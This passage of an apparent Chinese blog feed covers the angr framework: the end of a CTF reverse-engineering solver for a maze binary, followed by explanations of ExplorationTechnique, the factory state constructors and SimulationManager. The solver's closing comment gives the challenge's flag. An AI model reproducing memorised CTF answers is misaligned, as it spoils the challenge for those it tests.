class="hljs-title function_">StateSplitter</span>(<span class="hljs-params">self,states:<span class="hljs-built_in">list</span>[angr.SimState]</span>) -&gt; <span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">list</span>[angr.SimState],<span class="hljs-built_in">list</span>[angr.SimState]]:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        此函数用于分拣State，如果访问过就不要让这个State加入下一次的循环了</span><br><span class="hljs-string">        类似于BFS那个核心要点</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>            _keep =[]<br>            _split =[]<br>            <span class="hljs-keyword">for</span> state <span class="hljs-keyword">in</span> states:<br>                <span class="hljs-keyword">if</span> self.isInMaze(state): <span class="hljs-comment">#判断是否在迷宫范围内是因为走迷宫的时候会call &#x27;step&#x27; 函数，那个我们不处理</span><br>                    <span class="hljs-keyword">if</span> state.addr <span class="hljs-keyword">in</span> self._Vistited:<br>                        _split.append(state)<br>                    <span class="hljs-keyword">else</span>:<br>                        self._Vistited.add(state.addr)<br>                        _keep.append(state)<br>                <span class="hljs-keyword">else</span>:<br>                    _keep.append(state) <span class="hljs-comment"># &#x27;step&#x27;或者其他非迷宫内部的state我们都要执行</span><br><br>            <span class="hljs-keyword">return</span> _keep,_split<span class="hljs-comment"># 这里的返回顺序不能改，前面的是保留的，后面的是舍弃的</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">isEnd</span>(<span class="hljs-params">self,state:SimState</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>            <span class="hljs-keyword">return</span> state.addr == self._MazeFinal <span class="hljs-comment"># 判断是否到终点了</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">self,simgr:angr.SimulationManager,stash :<span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;active&#x27;</span>,**kwargs</span>) -&gt; angr.SimulationManager:<br>        <span class="hljs-comment"># 模拟执行</span><br>        simgr.step(stash=stash,**kwargs)<br><br>        <span class="hljs-comment"># 筛选用于下一次执行的state</span><br>        simgr.split(stash_splitter = self.StateSplitter,from_stash = <span class="hljs-string">&#x27;active&#x27;</span>,to_stash = <span class="hljs-string">&#x27;visited&#x27;</span>)<br><br>        <span class="hljs-comment"># 将到终点的state存下来</span><br>        simgr.move(from_stash = <span class="hljs-string">&#x27;active&#x27;</span>,to_stash = <span class="hljs-string">&#x27;found&#x27;</span>,filter_func = self.isEnd)<br><br>        <span class="hljs-keyword">return</span> simgr<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">complete</span>(<span class="hljs-params">self,simgr:angr.SimulationManager</span>):<br>        <span class="hljs-comment"># 定义找到终点就结束</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(simgr.found)<br>    <br><br><span class="hljs-comment"># 装载 设定基址为0</span><br>proj = angr.Project(<span class="hljs-string">&quot;./maze&quot;</span>,auto_load_libs = <span class="hljs-literal">False</span>,main_opts=&#123;<span class="hljs-string">&#x27;base_addr&#x27;</span>: <span class="hljs-number">0</span>&#125;)<br><br><span class="hljs-comment"># 找到这几个对象</span><br>SymMazeWalk = proj.loader.find_symbol(<span class="hljs-string">&quot;maze_walk&quot;</span>)<br>SymMazeFinal = proj.loader.find_symbol(<span class="hljs-string">&quot;maze_final&quot;</span>)<br><br>SymKey = proj.loader.find_symbol(<span class="hljs-string">&quot;key&quot;</span>)<br>SymSteps = proj.loader.find_symbol(<span class="hljs-string">&quot;steps&quot;</span>)<br><br>KeyValue = claripy.BVS(<span class="hljs-string">&quot;SymKey&quot;</span>,<span class="hljs-number">64</span>)<br><br><span class="hljs-comment"># 从 maze_walk 开始</span><br>State = proj.factory.call_state(SymMazeWalk.rebased_addr,prototype = <span class="hljs-string">&#x27;void f()&#x27;</span>)<br>State.options.add(angr.sim_options.ZERO_FILL_UNCONSTRAINED_REGISTERS)<br><br><span class="hljs-comment"># 因为我们跳过了main函数，没有执行输入 所以要自己把输入给存进内存</span><br>State.memory.store(SymKey.rebased_addr,KeyValue)<br>State.memory.store(SymSteps.rebased_addr,KeyValue)<br><br><span class="hljs-comment"># 实例化我们的Walk</span><br>tech = Walk(MazeRange=(SymMazeWalk.rebased_addr,SymMazeWalk.rebased_addr + SymMazeWalk.size),<br>            MazeFinal=SymMazeFinal.rebased_addr)<br><br><span class="hljs-comment"># 准备执行</span><br>Simgr = proj.factory.simgr(State)<br><span class="hljs-comment"># 使用我们的搜索方式</span><br>Simgr.use_technique(tech)<br><br><span class="hljs-comment"># 开始跑 直到找到可以达终点的state</span><br>Simgr.run()<br><span class="hljs-comment"># 移除我们的搜索方式 准备继续执行</span><br>Simgr.remove_technique(tech)<br><br><span class="hljs-comment"># 从我们找到那个state开始执行</span><br>SolveState = proj.factory.simgr(Simgr.found[<span class="hljs-number">0</span>])<br>SolveState.run()<br><span class="hljs-comment"># 执行到最后得到输出 即为flag</span><br><span class="hljs-built_in">print</span>(SolveState.deadended[<span class="hljs-number">0</span>].posix.dumps(<span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># miniLctf&#123;YOU_AR3_$0_GOOD_4T_SOLV1NG_MAZE&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
      <tag>idapython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ExplorationTechnique</title>
    <link href="/2023/05/24/ExplorationTechniques/"/>
    <url>/2023/05/24/ExplorationTechniques/</url>
    
    <content type="html"><![CDATA[<p>About <a href="https://docs.angr.io/en/latest/_modules/angr/exploration_techniques.html#ExplorationTechnique">ExplorationTechnique</a></p><span id="more"></span><p>首先，这也是一个类。先来看看angr对这个类的说明</p><blockquote><p><em>An technique is a set of hooks for a simulation manager that assists in the implementation of new techniques in symbolic exploration.</em>      </p><p><em>Any number of these methods may be overridden by a subclass.</em> <em>To use an exploration technique, call <code>simgr.use_technique</code> with an *instance* of the technique.</em></p></blockquote><p>就是说这个technique是一系列hook的集合，可以更好帮助我们符号执行。而且这个类里面的方法都可以使用子类重写，用一个实例来调用<code>simgr.use_technique</code> </p><p>其实这个类就是帮我们把符号执行所必须的几个步骤给我们打包起来，然后让我们重载里面的步骤，新生成一个子类，然后按照这子类里面规定的方法去符号执行</p><p>这是整个类的定义以及相关成员函数的说明</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ExplorationTechnique</span>:<br><br>    <span class="hljs-comment"># 主要hook函数</span><br>    _hook_list = (<span class="hljs-string">&quot;step&quot;</span>, <span class="hljs-string">&quot;filter&quot;</span>, <span class="hljs-string">&quot;selector&quot;</span>, <span class="hljs-string">&quot;step_state&quot;</span>, <span class="hljs-string">&quot;successors&quot;</span>)<br><br>    <span class="hljs-comment"># 得到被重写的hook函数</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_hooks</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> &#123;name: <span class="hljs-built_in">getattr</span>(self, name) <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> self._hook_list <span class="hljs-keyword">if</span> self._is_overriden(name)&#125;<br>    <br><span class="hljs-comment"># 判断哪些函数被重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_is_overriden</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(self, name).__code__ <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">getattr</span>(ExplorationTechnique, name).__code__<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(self, <span class="hljs-string">&quot;project&quot;</span>):<br>            self.project: angr.project.Project = <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 这确实就是一个空函数，专门提供给使用者来初始化自己所要的</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">self, simgr</span>):<br>        <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">self, simgr, stash=<span class="hljs-string">&quot;active&quot;</span>, **kwargs</span>): <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">         用来hook step函数，最后应该调用simgr.step以便真正执行</span><br><span class="hljs-string">         原本的step是往下执行一步，去到后继block</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        simgr.step(stash=stash, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">self, simgr, state, **kwargs</span>):  <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">          决定该state要被移去哪一个stash</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          如果说这个state要被filter的话，就把这个state要被移去的stash名字返回</span><br><span class="hljs-string">          如果想在filter之前对state做一些改变，就返回一个stash的元组，并修改state</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          这和step里的filter_fun起到的作用一样的</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> simgr.<span class="hljs-built_in">filter</span>(state, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">selector</span>(<span class="hljs-params">self, simgr, state, **kwargs</span>):  <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        决定该state是否要参与进这个step round，也就是如果这个state要进入的话，就返</span><br><span class="hljs-string">        回True否则返回False</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        这个step里的selector_fun起到的作用是一样的</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> simgr.selector(state, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step_state</span>(<span class="hljs-params">self, simgr, state, **kwargs</span>):  <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        决定该state的successor应该放去哪个块。结果应该是一个stash到successor列表的字典映射</span><br><span class="hljs-string">        如[&quot;active:[succ1,succ2]&quot;]</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        note:该函数的优先级高于filter filter是作用于当前返回的state</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> simgr.step_state(state, **kwargs)<br><br><br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">successors</span>(<span class="hljs-params">self, simgr, state, **kwargs</span>):  <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        在进入一个state时调用，返回一个SimSuccssors对象</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> simgr.successors(state, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">complete</span>(<span class="hljs-params">self, simgr</span>):  <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        返回当前simgr是否到达 &quot;completed&quot; state</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        该方法不是hook的对象，也不应该直接调用此方法，而是应该自己决定返回True或者False</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>setup</code> 初始化</p><p><code>step</code> hook步入</p><p><code>filter</code>决定该state放去哪 即丢去哪</p><p><code>selector</code> 决定该state是否执行 </p><p><code>step_state</code> 决定successors放去哪个stash</p><p><code>successors</code> 在进入一个state时调用</p><p><code>complete</code> 是否全部完成</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>angr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Factory SimManger State</title>
    <link href="/2023/05/24/Factory%20SimManger%20State/"/>
    <url>/2023/05/24/Factory%20SimManger%20State/</url>
    
    <content type="html"><![CDATA[<p><a href="https://docs.angr.io/en/latest/_modules/angr/factory.html">facntory</a> <a href="https://docs.angr.io/en/latest/_modules/angr/sim_manager.html#SimulationManager">SimManger</a> State</p><span id="more"></span><p>一般使用angr时，都会以以下几句开头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br>proj = angr.Project(<span class="hljs-string">&#x27;examples/fauxware/fauxware&#x27;</span>, auto_load_libs=<span class="hljs-literal">False</span>)<br>state = proj.factory.entry_state()<br>simgr = proj.factory.simgr(state)<br></code></pre></td></tr></table></figure><p>现在就来看看<code>factory</code>都究竟是个啥</p><p>首先factory是一个类，但是它更像是一个工具类，帮助我们完成一些事情，我们就可以简单调用里面的方法。比如我们想要初始化一个入口函数的<code>state</code>,那么我们就可以调用<code>factory</code>里面的<code>entry_state()</code>,就不用自己再去关心那细节。</p><p>现在就来看看里面还有哪些方法</p><h2 id="State"><a href="#State" class="headerlink" title="State"></a>State</h2><h3 id="blank-state-self-kwargs"><a href="#blank-state-self-kwargs" class="headerlink" title="blank_state(self, **kwargs)"></a>blank_state(self, **kwargs)</h3><p>调用此方法，会返回一个几乎没有初始化的state对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">blank_state</span>(<span class="hljs-params">self,**kwargs</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Returns a mostly-uninitialized state object. All parameters are optional.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param addr:            State 开始的地址</span><br><span class="hljs-string">        :param initial_prefix:  如果提供，所有的符号寄存器都会有一个以此为前缀字符串的符号值</span><br><span class="hljs-string">        :param fs:              A dictionary of file names with associated preset SimFile objects.</span><br><span class="hljs-string">        :param concrete_fs:     bool describing whether the host filesystem should be consulted when opening files.</span><br><span class="hljs-string">        :param chroot:          A path to use as a fake root directory, Behaves similarly to a real chroot. Used only when concrete_fs is set to True.</span><br><span class="hljs-string">        :param kwargs:          Any additional keyword args will be passed to the SimState constructor.</span><br><span class="hljs-string">        :return:                返回一个空 state</span><br><span class="hljs-string">        :rtype:                 返回类型 SimState</span><br><span class="hljs-string"> &quot;&quot;&quot;</span><br> <span class="hljs-keyword">return</span> self.project.simos.state_blank<br></code></pre></td></tr></table></figure><h3 id="entry-state-self-kwargs"><a href="#entry-state-self-kwargs" class="headerlink" title="entry_state(self, **kwargs)"></a>entry_state(self, **kwargs)</h3><p>调用此方法，返回一个起始地址的<code>state</code></p><h3 id="full-init-state-self-kwargs"><a href="#full-init-state-self-kwargs" class="headerlink" title="full_init_state(self, **kwargs)"></a>full_init_state(self, **kwargs)</h3><blockquote><p><em>Very much like :meth:<code>entry_state()</code>, except that instead of starting execution at the program entry point,</em>        <em>execution begins at a special SimProcedure that plays the role of the dynamic loader, calling each of the</em>        <em>initializer functions that should be called before execution reaches the entry point.</em>         <em>It can take any of the arguments that can be provided to <code>entry_state</code>, except for <code>addr</code>.</em></p></blockquote><p>意思是，这个方法拥有以上的所有参数除了addr，因为这个方法是先于符号执行的，它的作用是初始化，调用哪些所有的初始化函数</p><h3 id="call-state-self-addr-args-kwargs"><a href="#call-state-self-addr-args-kwargs" class="headerlink" title="call_state(self, addr, *args, **kwargs)"></a>call_state(self, addr, *args, **kwargs)</h3><p>很显然是一个创建call到某个函数的state，它的参数</p><blockquote><p><em>Returns a state object initialized to the start of a given function, as if it were called with given parameters.</em>         </p><p><em>:param addr:            The address the state should start at instead of the entry point.</em>        </p><p><em>:param args:            Any additional positional arguments will be used as arguments to the function call.</em> </p></blockquote><p>返回一个以给定函数起初地址的<code>state</code>，换句话说提供<code>addr</code>,它将以此创建一个<code>state</code>,而不再是entry point。它也可以通过<code>args</code>来传递所call的函数参数</p><h2 id="Simulation-Manager"><a href="#Simulation-Manager" class="headerlink" title="Simulation Manager"></a>Simulation Manager</h2><h3 id="simgr-simulation-manager-self-thing-Optional-Union-List-SimState-SimState-x3D-None-kwargs"><a href="#simgr-simulation-manager-self-thing-Optional-Union-List-SimState-SimState-x3D-None-kwargs" class="headerlink" title="simgr simulation_manager( self, thing: Optional[Union[List[SimState], SimState]] &#x3D; None,**kwargs)"></a>simgr simulation_manager( self, <strong>thing</strong>: Optional[Union[List[SimState], SimState]] &#x3D; None,**kwargs)</h3><blockquote><p><em>Constructs a new simulation manager.</em>         </p><p><em>:param thing: What to put in the new SimulationManager’s active stash (either a SimState   or a list of</em>  <em>SimStates).</em> </p><p><em>:param kwargs:  Any additional keyword arguments will be passed to the SimulationManager                        constructor</em>        </p><p><em>:returns:               The new SimulationManager</em>        </p><p><em>:rtype:                 angr.sim_manager.SimulationManager</em> </p></blockquote><p>这个方法也很常用，但是它不再是创建和返回state对象，而是利用state对象创建一个simulation manager对象并返回。它的参数就是接受一个state列表或者单独一个state，并把他们放进stash的active里面。如果什么参数也不传，那么它就默认以entry_point为state创建。</p><p>那么这个<code>simulation manager</code>对象是个啥呢？</p><h3 id="SimulationManager"><a href="#SimulationManager" class="headerlink" title="SimulationManager"></a>SimulationManager</h3><p>angr在[文档](<a href="https://docs.angr.io/en/latest/_modules/angr/sim_manager.html#SimulationManager">angr.sim_manager - angr documentation</a>)里面这样评论<em>The Simulation Manager is the future future.</em></p><p>SimulationManager 也是angr里面的一个类。这个类的功能就是帮助我们根据state的stash来管理state，可以往下step，可以过滤filter，也可以融合merge。可以通过属性值来直接获取stash，比如<code>.active</code>,也可以用一些前缀比如<code>mp_</code>,那么就可以<code>mp_active</code>,同理<code>one_</code>.</p><p>这是它的一些成员</p><blockquote><p><em>:param project:           A Project instance.</em>    </p><p><em>:type project:              angr.project.Project</em>   </p><p> <em>:param stashes:</em>           一个字典用于存储stash   </p><p><em>:param active_states:   Active states to seed the “active” stash with.</em>    </p><p><em>:param hierarchy:</em>         一个StateHierarchy对象，用于追踪state之间关系</p><p> <em>:param resilience:</em>        收集error的集合    </p><p><em>:param save_unsat:</em>       如果为True，则保留unsat的state，而不是直接丢掉 </p><p><em>:param auto_drop:</em>        存放直接丢弃的stash的名字</p><p><em>:param completion_mode:</em>     描述exploretion techniques的函数</p><p> <em>:param techniques:</em> 需要预先设定exploretion tech的列表    </p><p>……</p></blockquote><p>当然里面也有很多的方法，最重要的是<code>step</code> ,<code>explore</code>,<code>use_technique</code>三个方法</p><p>看看它的构造函数，通过初始化函数就能这些成员有一个更直观的了解</p><h4 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"></span><br><span class="hljs-params">        self,</span><br><span class="hljs-params">        project,</span><br><span class="hljs-params">        active_states=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        stashes=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        hierarchy=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        resilience=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        save_unsat=<span class="hljs-literal">False</span>,</span><br><span class="hljs-params">        auto_drop=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        errored=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        completion_mode=<span class="hljs-built_in">any</span>,</span><br><span class="hljs-params">        techniques=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        suggestions=<span class="hljs-literal">True</span>,</span><br><span class="hljs-params">        **kwargs,</span><br><span class="hljs-params">    </span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br><br>        self._project = project<br>        self.completion_mode = completion_mode<br>        self._errored = []<br>        self._lock = PicklableLock()<br><span class="hljs-comment">#  这里就可以放入自己的stash</span><br>        <span class="hljs-keyword">if</span> stashes <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            stashes = self._create_integral_stashes()<br>        self._stashes: DefaultDict[<span class="hljs-built_in">str</span>, <span class="hljs-type">List</span>[<span class="hljs-string">&quot;SimState&quot;</span>]] = stashes<br>        self._hierarchy = StateHierarchy() <span class="hljs-keyword">if</span> hierarchy <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> hierarchy<br>        self._save_unsat = save_unsat<br>        self._auto_drop = &#123;<br>            SimulationManager.DROP,<br>        &#125;<br>        self._techniques = []<br><br>        <span class="hljs-keyword">if</span> resilience <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self._resilience = (AngrError, SimError, claripy.ClaripyError)<br>        <span class="hljs-keyword">elif</span> resilience <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>            self._resilience = (<br>                AngrError,<br>                SimError,<br>                claripy.ClaripyError,<br>                KeyError,<br>                IndexError,<br>                TypeError,<br>                ValueError,<br>                ArithmeticError,<br>                MemoryError,<br>            )<br>        <span class="hljs-keyword">elif</span> resilience <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>:<br>            self._resilience = ()<br>        <span class="hljs-keyword">else</span>:<br>            self._resilience = <span class="hljs-built_in">tuple</span>(resilience)<br><br>        <span class="hljs-keyword">if</span> suggestions:<br>            self.use_technique(Suggestions())<br><br>        <span class="hljs-comment"># 8&lt;----------------- Compatibility layer -----------------</span><br><br>        <span class="hljs-keyword">if</span> auto_drop <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> kwargs.pop(<span class="hljs-string">&quot;save_unconstrained&quot;</span>, <span class="hljs-literal">True</span>):<br>            self._auto_drop |= &#123;<span class="hljs-string">&quot;unconstrained&quot;</span>&#125;<br><br>        <span class="hljs-keyword">if</span> kwargs.pop(<span class="hljs-string">&quot;veritesting&quot;</span>, <span class="hljs-literal">False</span>):<br>            self.use_technique(Veritesting(**kwargs.get(<span class="hljs-string">&quot;veritesting_options&quot;</span>, &#123;&#125;)))<br>        kwargs.pop(<span class="hljs-string">&quot;veritesting_options&quot;</span>, &#123;&#125;)<br><br>        threads = kwargs.pop(<span class="hljs-string">&quot;threads&quot;</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">if</span> threads <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            self.use_technique(Threading(threads))<br><br>        <span class="hljs-keyword">if</span> kwargs:<br>            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;Unexpected keyword arguments: &quot;</span> + <span class="hljs-string">&quot; &quot;</span>.join(kwargs))<br>        <span class="hljs-comment"># ------------------ Compatibility layer ----------------&gt;8</span><br><br>        <span class="hljs-keyword">if</span> auto_drop:<br>            self._auto_drop |= <span class="hljs-built_in">set</span>(auto_drop)<br><br>        <span class="hljs-keyword">if</span> errored <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            self._errored.extend(errored)<br><br>        <span class="hljs-keyword">if</span> active_states:<br>            self._store_states(<span class="hljs-string">&quot;active&quot;</span>, active_states)<br><br>        <span class="hljs-keyword">if</span> techniques:<br>            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> techniques:<br>                self.use_technique(t)<br></code></pre></td></tr></table></figure><h4 id="step"><a href="#step" class="headerlink" title="step"></a>step</h4><p>看看它的参数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">step</span>(<span class="hljs-params"></span><br><span class="hljs-params">        self,</span><br><span class="hljs-params">        stash=<span class="hljs-string">&quot;active&quot;</span>,</span><br><span class="hljs-params">        target_stash=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        n=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        selector_func=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        step_func=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        error_list=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        successor_func=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        until=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        filter_func=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        **run_args,</span><br><span class="hljs-params">    </span>):<br>    <br></code></pre></td></tr></table></figure><blockquote><p><em>stash</em> : 需要step的stash名字，默认是active</p><p><em>target_stash</em> :  将结果放入哪个stash</p><p><em>n</em> :    如果<code>until</code>是NULL的话，那么会一直执行n步</p><p><em><strong>selector_fun</strong></em> : 接收一个以state为参数、返回类型为布尔的函数，如果返回为True，那么执行该                                                                                               state，否则保持原样</p><p><em><strong>step_fun</strong></em> :   接收一个以SimulationManager为参数并返回SimulantionManager的函数，每一次调用<code>step()</code>时，都会调用该函数，但该函数里面不应该有<code>step(</code>)</p><p><em>error_list</em> :一个list来存储<code>ErroredState</code></p><p><em>successor_fun</em> :接收一个以state为参数并返回它后继的函数</p><p>until：  接收一个以SimulationManger为参数并返回布尔值的函数，一直执行到返回为True</p><p><em>filter_func</em> ： 